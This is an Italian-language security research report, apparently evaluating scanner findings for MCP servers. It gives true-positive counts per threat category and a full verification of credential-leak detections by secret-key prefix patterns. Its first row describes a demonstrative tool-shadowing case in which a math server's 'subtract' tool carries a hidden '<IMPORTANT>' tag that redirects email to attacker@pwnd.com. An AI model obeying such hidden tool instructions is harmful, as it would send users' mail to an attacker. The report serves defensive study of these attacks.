| 1 | `michaelguo1991/math-mcp-server-nodejs` | `subtract` | `<IMPORTANT>` tag che redirige email a `attacker@pwnd.com` | **VP-C (VP)** — classico tool shadowing dimostrativo (vedi CLAUDE.md). |

### Per saperne di più su tutta l'analisi fatta: scaricare e leggere la chat di gemini "Veri Positivi: Sicurezza MCP Server" -> https://gemini.google.com/share/16bfc0cdebd6

#	Minaccia	VP
1	sql-injection	30/2406
2	dangerous-capabilities	15/3745
3	credential-leak	1258/1342
4	ssrf	15/741
5	untrusted-content	15/952
6	path-traversal	15/537
7	command-injection	15/274
8	code-injection	23/220
9	input-validation	19/254
10	protocol-violation	15/15436
11	prompt-injection	16/118
12	insecure-deserialization	15/31
13	sensitive-file-access	18/18
14	sensitive-info-disclosure	15/1873
15	access-control	8/8
16	data-exfiltration	2/2
17	tool-shadowing	1/1

---

## Verifica automatica completa — credential-leak (intera categoria, fatta in chat)

A differenza del campione di 15 della sezione 3, qui è stata classificata **l'intera categoria credential-leak** in modo meccanico, leggendo la riga `evidence` (mcp-watch) e il codice dopo `Code:` (mcp-guard `hardcoded-credential-static`).

- **VP** = la riga contiene un segreto reale: chiave provider (`AIza`, `sk-`, `ghp_`, `AKIA`, `GOCSPX-`, `xox*`, Stripe `*_live_*`), JWT, private key, connection string con credenziali, oppure password/segreto hardcoded.
- **FP** = placeholder (`your-api-key-here`, `***MASKED***`, AWS doc `...EXAMPLEKEY`), riferimento a env-var (`process.env`, `${token}` scritto in `.env`), chiave pubblica-by-design (Firebase web config, Google CrUX), valore == nome della variabile, valore vuoto.

| Fonte | Entries | VP | FP |
|-------|--------:|---:|---:|
| mcp-watch credential-leak | 665 | 645 | 20 |
| mcp-guard hardcoded-credential-static | 677 | 613 | 64 |
| **TOTALE** | **1.342** | **1.258** | **84** |

**Risultato: 1.258 VP su 1.342 entries (93,7%).** Coerente con il campione manuale (gli FP sono soprattutto Firebase/CrUX e placeholder, vedi #1/#11/#12 della sezione 3). Script riproducibile: `cross_framework/_verify_credleak.py`.

> Nota: il totale corrente è 1.342 (dataset merged GitHub+NPX); il "1.269" nella tabella sopra era il conteggio pre-merge (solo GitHub: 619 + 650).